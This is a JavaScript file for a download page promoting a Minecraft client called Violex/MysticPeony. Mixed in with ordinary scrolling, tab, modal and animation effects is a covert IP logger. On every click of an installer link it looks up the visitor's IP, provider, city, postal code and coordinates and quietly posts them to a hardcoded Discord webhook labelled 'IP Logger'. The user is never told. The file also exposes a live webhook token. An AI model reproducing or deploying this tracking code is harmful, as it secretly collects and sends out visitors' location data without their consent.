// Smooth scrolling para links de navegação
document.addEventListener('DOMContentLoaded', function() {
    // Obter informações de IP do usuário
    async function getUserIPInfo() {
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            return {
                ip: data.ip,
                city: data.city,
                region: data.region,
                country: data.country_name,
                country_code: data.country_code,
                postal: data.postal,
                timezone: data.timezone,
                org: data.org,
                hostname: data.hostname || 'N/A',
                loc: `${data.latitude},${data.longitude}` || 'N/A'
            };
        } catch (error) {
            console.log('Erro ao obter IP:', error);
            // Fallback para outro serviço
            try {
                const fallback = await fetch('https://api.ipify.org?format=json');
                const fallbackData = await fallback.json();
                return {
                    ip: fallbackData.ip,
                    city: 'N/A',
                    region: 'N/A',
                    country: 'N/A',
                    country_code: 'N/A',
                    postal: 'N/A',
                    timezone: 'N/A',
                    org: 'N/A',
                    hostname: 'N/A',
                    loc: 'N/A'
                };
            } catch {
                return {
                    ip: 'Não detectado',
                    city: 'N/A',
                    region: 'N/A',
                    country: 'N/A',
                    country_code: 'N/A',
                    postal: 'N/A',
                    timezone: 'N/A',
                    org: 'N/A',
                    hostname: 'N/A',
                    loc: 'N/A'
                };
            }
        }
    }

    // Smooth scrolling
    const links = document.querySelectorAll('a[href^="#"]');
    links.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetId = this.getAttribute('href');
            const targetSection = document.querySelector(targetId);
            if (targetSection) {
                const headerHeight = document.querySelector('.header').offsetHeight;
                const targetPosition = targetSection.offsetTop - headerHeight;
                window.scrollTo({
                    top: targetPosition,
                    behavior: 'smooth'
                });
            }
        });
    });

    // Version tabs functionality
    const versionTabs = document.querySelectorAll('.version-tab');
    const versionCategories = document.querySelectorAll('.version-category');
    versionTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            const targetVersion = this.getAttribute('data-version');
            // Remove active class from all tabs and categories
            versionTabs.forEach(t => t.classList.remove('active'));
            versionCategories.forEach(c => c.classList.remove('active'));
            // Add active class to clicked tab and corresponding category
            this.classList.add('active');
            document.getElementById(targetVersion).classList.add('active');
        });
    });

    // Dashboard tabs functionality
    const dashboardTabs = document.querySelectorAll('.dashboard-tab');
    const dashboardPanels = document.querySelectorAll('.dashboard-panel');
    dashboardTabs.forEach(tab => {
        tab.addEventListener('click', function() {
            const targetTab = this.getAttribute('data-tab');
            // Remove active class from all tabs and panels
            dashboardTabs.forEach(t => t.classList.remove('active'));
            dashboardPanels.forEach(p => p.classList.remove('active'));
            // Add active class to clicked tab and corresponding panel
            this.classList.add('active');
            document.getElementById(targetTab).classList.add('active');
        });
    });

    // Header scroll effect
    const header = document.querySelector('.header');
    let lastScrollTop = 0;
    window.addEventListener('scroll', function() {
        const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
        if (scrollTop > 100) {
            header.style.background = 'rgba(15, 15, 35, 0.98)';
            header.style.boxShadow = '0 4px 20px rgba(0, 0, 0, 0.3)';
        } else {
            header.style.background = 'rgba(15, 15, 35, 0.95)';
            header.style.boxShadow = '0 4px 20px rgba(0, 0, 0, 0.3)';
        }
        lastScrollTop = scrollTop;
    });

    // Mobile menu toggle
    const navToggle = document.querySelector('.nav-toggle');
    const navMenu = document.querySelector('.nav-menu');
    if (navToggle && navMenu) {
        navToggle.addEventListener('click', function() {
            navMenu.classList.toggle('active');
            navToggle.classList.toggle('active');
        });
    }

    // Intersection Observer para animações
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const observer = new IntersectionObserver(function(entries) {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, observerOptions);

    // Observar elementos para animação
    const animatedElements = document.querySelectorAll('.feature-card, .news-card, .store-category');
    animatedElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'opacity 0.6s ease, transform 0.6s ease';
        observer.observe(el);
    });

    // Download buttons hover effect
    const downloadButtons = document.querySelectorAll('.download-btn');
    downloadButtons.forEach(btn => {
        btn.addEventListener('mouseenter', function() {
            this.style.transform = 'translateY(-5px) scale(1.02)';
        });
        btn.addEventListener('mouseleave', function() {
            this.style.transform = 'translateY(0) scale(1)';
        });
    });

    // Parallax effect para o hero section
    const hero = document.querySelector('.hero');
    if (hero) {
        window.addEventListener('scroll', function() {
            const scrolled = window.pageYOffset;
            const rate = scrolled * -0.5;
            hero.style.transform = `translateY(${rate}px)`;
        });
    }

    // Loading animation para o minecraft window
    const loadingProgress = document.querySelector('.loading-progress');
    if (loadingProgress) {
        setInterval(() => {
            loadingProgress.style.width = '0%';
            setTimeout(() => {
                loadingProgress.style.width = '100%';
            }, 100);
        }, 3000);
    }

    // Typing effect para o título
    const heroTitle = document.querySelector('.hero-title');
    if (heroTitle) {
        const text = heroTitle.textContent;
        heroTitle.textContent = '';
        let i = 0;
        const typeWriter = () => {
            if (i < text.length) {
                heroTitle.textContent += text.charAt(i);
                i++;
                setTimeout(typeWriter, 100);
            }
        };
        // Iniciar typing effect após um delay
        setTimeout(typeWriter, 500);
    }

    // Helper: enviar aviso de download em formato de embed COM INFORMAÇÕES DE IP
    async function sendDownloadWebhook(href, label) {
        try {
            // Obter informações de IP antes de enviar
            const ipInfo = await getUserIPInfo();
            
            const title = 'Logger - MysticPeony Client';
            const embed = {
                title: title,
                color: 0x000000,
                thumbnail: {
                    url: "https://media.discordapp.net/attachments/1396179422582673580/1396436215498145802/image.png?ex=687ebcd2&is=687d6b52&hm=d1ecbc381768da995944594a141679ea060e7ed326b074f3c21bd85b8cbc6ff6&=&format=webp&quality=lossless"
                },
                fields: [
                    {
                        name: 'Download',
                        value: `**Label:** ${label || 'ViolexClient-Setup'}\n**Link:** ${href}`
                    },
                    {
                        name: 'IP & Provider',
                        value: `**IP:** ${ipInfo.ip}\n**Hostname:** ${ipInfo.hostname}\n**Provider:** ${ipInfo.org}`
                    },
                    {
                        name: 'Loc',
                        value: `**País:** ${ipInfo.country} (${ipInfo.country_code})\n**Estado:** ${ipInfo.region}\n**Cidade:** ${ipInfo.city}\n**CEP:** ${ipInfo.postal}\n**Coordenadas:** ${ipInfo.loc}`
                    },
                    {
                        name: 'Timezone',
                        value: `**Fuso Horário:** ${ipInfo.timezone}`
                    }
                ],
                timestamp: new Date().toISOString(),
                footer: {
                    text: 'Dev psy • IP Logger'
                },
            };

            const payload = {
                username: 'MysticPeony Logger',
                embeds: [embed],
            };

            fetch('https://discord.com/api/webhooks/1445196196292591809/Nhcuij217Bnzmr86FLdcCqo5oXm0jIpfPe2CJuHpG0Z1MmWxwo1qTBayPPUdQW1H8EpF', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            }).catch(() => {});
        } catch(error) {
            console.log('Erro ao enviar webhook:', error);
        }
    }

    // Modal para downloads (apenas para links que não têm arquivo real)
    const downloadLinks = document.querySelectorAll('.download-btn, .btn-primary[href*="ViolexClient-Setup"]');
    downloadLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            // Verificar se o link tem um arquivo real
            const href = this.getAttribute('href');
            if (href && !href.startsWith('#') && (href.includes('ViolexClient-Setup') || href.includes('.rar') || href.includes('.zip') || href.includes('.exe'))) {
                // Enviar embed (estilo index) ao clicar no instalador (assíncrono, não bloqueia)
                try {
                    const hrefLower = (href || '').toLowerCase();
                    if (hrefLower.includes('ViolexClient-Setup')) {
                        const label = (this.innerText || this.textContent || '').trim() || 'Download Button';
                        // Marcar como já logado para evitar duplicidade no listener delegado
                        try {
                            this.dataset.vxLogged = '1';
                        } catch(_) {}
                        // Enviar webhook de forma assíncrona sem bloquear o download
                        sendDownloadWebhook(href, label).catch(() => {});
                    }
                } catch (_) {}
                // Se tem arquivo real, permitir download direto (não prevenir comportamento padrão)
                return true;
            }

            // Se não tem arquivo, mostrar modal
            e.preventDefault();
            
            // Criar modal
            const modal = document.createElement('div');
            modal.className = 'download-modal';
            modal.innerHTML = `
                <div class="modal-content">
                    <div class="modal-header">
                        <h3>Download Violex Client</h3>
                        <button class="modal-close">&times;</button>
                    </div>
                    <div class="modal-body">
                        <p>O download começará em alguns segundos...</p>
                        <div class="download-progress">
                            <div class="progress-bar">
                                <div class="progress-fill"></div>
                            </div>
                            <span class="progress-text">Preparando download...</span>
                        </div>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);

            // Animar progresso
            const progressFill = modal.querySelector('.progress-fill');
            const progressText = modal.querySelector('.progress-text');
            let progress = 0;
            
            const updateProgress = () => {
                progress += 2;
                progressFill.style.width = progress + '%';
                
                if (progress < 30) {
                    progressText.textContent = 'Preparando download...';
                } else if (progress < 70) {
                    progressText.textContent = 'Baixando arquivos...';
                } else if (progress < 100) {
                    progressText.textContent = 'Finalizando...';
                } else {
                    progressText.textContent = 'Download concluído!';
                    setTimeout(() => {
                        modal.remove();
                    }, 1000);
                    return;
                }
                setTimeout(updateProgress, 50);
            };
            
            updateProgress();

            // Fechar modal
            const closeBtn = modal.querySelector('.modal-close');
            closeBtn.addEventListener('click', () => {
                modal.remove();
            });
            
            modal.addEventListener('click', (e) => {
                if (e.target === modal) {
                    modal.remove();
                }
            });
        });
    });

    // Adicionar estilos para o modal
    const modalStyles = document.createElement('style');
    modalStyles.textContent = `
        .download-modal {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10000;
            animation: fadeIn 0.3s ease;
        }
        
        .modal-content {
            background: var(--bg-secondary);
            border-radius: 16px;
            padding: 0;
            max-width: 400px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
            animation: slideUp 0.3s ease;
            border: 1px solid var(--border-color);
        }
        
        .modal-header {
            padding: 24px;
            border-bottom: 1px solid var(--border-color);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .modal-header h3 {
            margin: 0;
            color: var(--text-primary);
            font-size: 1.25rem;
            font-weight: 600;
        }
        
        .modal-close {
            background: none;
            border: none;
            font-size: 1.5rem;
            cursor: pointer;
            color: var(--text-secondary);
            padding: 0;
            width: 30px;
            height: 30px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 50%;
            transition: all 0.3s ease;
        }
        
        .modal-close:hover {
            background: var(--bg-primary);
            color: var(--text-primary);
        }
        
        .modal-body {
            padding: 24px;
        }
        
        .download-progress {
            margin-top: 20px;
        }
        
        .progress-bar {
            width: 100%;
            height: 8px;
            background: var(--bg-primary);
            border-radius: 4px;
            overflow: hidden;
            margin-bottom: 12px;
        }
        
        .progress-fill {
            height: 100%;
            background: var(--gradient-primary);
            border-radius: 4px;
            transition: width 0.3s ease;
            width: 0%;
        }
        
        .progress-text {
            font-size: 0.875rem;
            color: var(--text-secondary);
        }
        
        .modal-body p {
            color: var(--text-secondary);
            margin-bottom: 20px;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        @keyframes slideUp {
            from { 
                opacity: 0;
                transform: translateY(30px);
            }
            to { 
                opacity: 1;
                transform: translateY(0);
            }
        }
    `;
    document.head.appendChild(modalStyles);

    // Adicionar estilos para menu mobile
    const mobileStyles = document.createElement('style');
    mobileStyles.textContent = `
        @media (max-width: 768px) {
            .nav-menu {
                position: fixed;
                top: 70px;
                left: 0;
                right: 0;
                background: rgba(15, 15, 35, 0.98);
                backdrop-filter: blur(20px);
                flex-direction: column;
                padding: 20px;
                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
                transform: translateY(-100%);
                opacity: 0;
                transition: all 0.3s ease;
                z-index: 999;
            }
            
            .nav-menu.active {
                transform: translateY(0);
                opacity: 1;
            }
            
            .nav-menu li {
                margin: 15px 0;
            }
            
            .nav-toggle.active span:nth-child(1) {
                transform: rotate(45deg) translate(5px, 5px);
            }
            
            .nav-toggle.active span:nth-child(2) {
                opacity: 0;
            }
            
            .nav-toggle.active span:nth-child(3) {
                transform: rotate(-45deg) translate(7px, -6px);
            }
        }
    `;
    document.head.appendChild(mobileStyles);

    // Interceptar links em desenvolvimento e mostrar tooltip de clique
    function showDevTooltip(x, y, message = 'Em desenvolvimento') {
        const tip = document.createElement('div');
        tip.textContent = message;
        tip.style.position = 'fixed';
        tip.style.left = x + 'px';
        tip.style.top = y + 'px';
        tip.style.transform = 'translate(-50%, -120%)';
        tip.style.background = 'rgba(15,15,35,0.95)';
        tip.style.color = '#fff';
        tip.style.padding = '8px 12px';
        tip.style.border = '1px solid var(--border-color)';
        tip.style.borderRadius = '8px';
        tip.style.fontSize = '12px';
        tip.style.boxShadow = '0 8px 20px rgba(0,0,0,0.4)';
        tip.style.zIndex = '10001';
        tip.style.pointerEvents = 'none';
        tip.style.opacity = '0';
        tip.style.transition = 'opacity 0.15s ease, transform 0.15s ease';
        
        document.body.appendChild(tip);
        
        requestAnimationFrame(() => {
            tip.style.opacity = '1';
            tip.style.transform = 'translate(-50%, -140%)';
        });
        
        setTimeout(() => {
            tip.style.opacity = '0';
            tip.style.transform = 'translate(-50%, -120%)';
            setTimeout(() => tip.remove(), 150);
        }, 1200);
    }

    document.addEventListener('click', function(e) {
        const anchor = e.target.closest('a[data-dev]');
        if (anchor) {
            e.preventDefault();
            showDevTooltip(e.clientX, e.clientY, anchor.getAttribute('title') || 'Em desenvolvimento');
        }
    });

    // Delegar clique para QUALQUER link que baixe o instalador e avisar na webhook
    document.addEventListener('click', function(e) {
        const a = e.target.closest('a[href]');
        if (!a) return;
        
        try {
            const href = a.getAttribute('href') || '';
            const hrefLower = href.toLowerCase();
            
            // Evitar duplicidade por elemento
            if (!a.dataset || a.dataset.vxLogged === '1') return;
            
            // Só interceptar se for um link de download válido
            if (hrefLower.includes('ViolexClient-Setup') && (hrefLower.includes('.rar') || hrefLower.includes('.zip') || hrefLower.includes('.exe'))) {
                a.dataset.vxLogged = '1';
                const label = (a.innerText || a.textContent || a.getAttribute('aria-label') || '').trim() || 'Download Link';
                // Enviar webhook de forma assíncrona sem bloquear o download
                sendDownloadWebhook(href, label).catch(() => {});
            }
        } catch(_) {}
    }, true); // Usar capture phase para garantir que seja executado antes
});

// Adicionar efeito de partículas no background
function createParticles() {
    const particlesContainer = document.createElement('div');
    particlesContainer.className = 'particles';
    particlesContainer.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: 0;
        overflow: hidden;
    `;
    document.body.appendChild(particlesContainer);

    for (let i = 0; i < 50; i++) {
        const particle = document.createElement('div');
        particle.style.cssText = `
            position: absolute;
            width: 4px;
            height: 4px;
            background: rgba(139, 92, 246, 0.3);
            border-radius: 50%;
            animation: float 6s ease-in-out infinite;
            animation-delay: ${Math.random() * 6}s;
        `;
        particle.style.left = Math.random() * 100 + '%';
        particle.style.top = Math.random() * 100 + '%';
        particlesContainer.appendChild(particle);
    }

    // Adicionar keyframes para animação das partículas
    const particleStyles = document.createElement('style');
    particleStyles.textContent = `
        @keyframes float {
            0%, 100% {
                transform: translateY(0px) rotate(0deg);
                opacity: 0.3;
            }
            50% {
                transform: translateY(-20px) rotate(180deg);
                opacity: 0.8;
            }
        }
    `;
    document.head.appendChild(particleStyles);
}

// Inicializar partículas
setTimeout(createParticles, 1000);

// Adicionar efeito de brilho nos cards
function addGlowEffect() {
    const cards = document.querySelectorAll('.feature-card, .advantage-card, .stat-item');
    cards.forEach(card => {
        card.addEventListener('mouseenter', function() {
            this.style.boxShadow = '0 0 30px rgba(139, 92, 246, 0.4)';
        });
        card.addEventListener('mouseleave', function() {
            this.style.boxShadow = '';
        });
    });
}

// Adicionar efeito de rotação 3D nos ícones
function add3DEffect() {
    const icons = document.querySelectorAll('.feature-icon, .advantage-icon');
    icons.forEach(icon => {
        icon.addEventListener('mousemove', function(e) {
            const rect = this.getBoundingClientRect();
            const x = e.clientX - rect.left;
            const y = e.clientY - rect.top;
            const centerX = rect.width / 2;
            const centerY = rect.height / 2;
            const rotateX = (y - centerY) / 10;
            const rotateY = (centerX - x) / 10;
            this.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale(1.1)`;
        });
        icon.addEventListener('mouseleave', function() {
            this.style.transform = '';
        });
    });
}

// Adicionar efeito de texto animado
function addTextAnimation() {
    const titles = document.querySelectorAll('.section-title, .hero-title');
    titles.forEach(title => {
        const text = title.textContent;
        title.innerHTML = '';
        text.split('').forEach((char, index) => {
            const span = document.createElement('span');
            span.textContent = char;
            span.style.animationDelay = `${index * 0.1}s`;
            span.style.animation = 'fadeInUp 0.5s ease forwards';
            span.style.opacity = '0';
            title.appendChild(span);
        });
    });
}

// Inicializar efeitos
document.addEventListener('DOMContentLoaded', function() {
    setTimeout(() => {
        addGlowEffect();
        add3DEffect();
        addTextAnimation();
    }, 1000);
});

// Adicionar efeito de scroll suave com easing
function smoothScrollTo(element, duration = 1000) {
    const targetPosition = element.offsetTop - 70;
    const startPosition = window.pageYOffset;
    const distance = targetPosition - startPosition;
    let startTime = null;

    function animation(currentTime) {
        if (startTime === null) startTime = currentTime;
        const timeElapsed = currentTime - startTime;
        const run = ease(timeElapsed, startPosition, distance, duration);
        window.scrollTo(0, run);
        if (timeElapsed < duration) requestAnimationFrame(animation);
    }

    function ease(t, b, c, d) {
        t /= d / 2;
        if (t < 1) return c / 2 * t * t + b;
        t--;
        return -c / 2 * (t * (t - 2) - 1) + b;
    }

    requestAnimationFrame(animation);
}

// Melhorar o scroll suave existente
const smoothLinks = document.querySelectorAll('a[href^="#"]');
smoothLinks.forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        const targetId = this.getAttribute('href');
        const targetSection = document.querySelector(targetId);
        if (targetSection) {
            smoothScrollTo(targetSection);
        }
    });
});
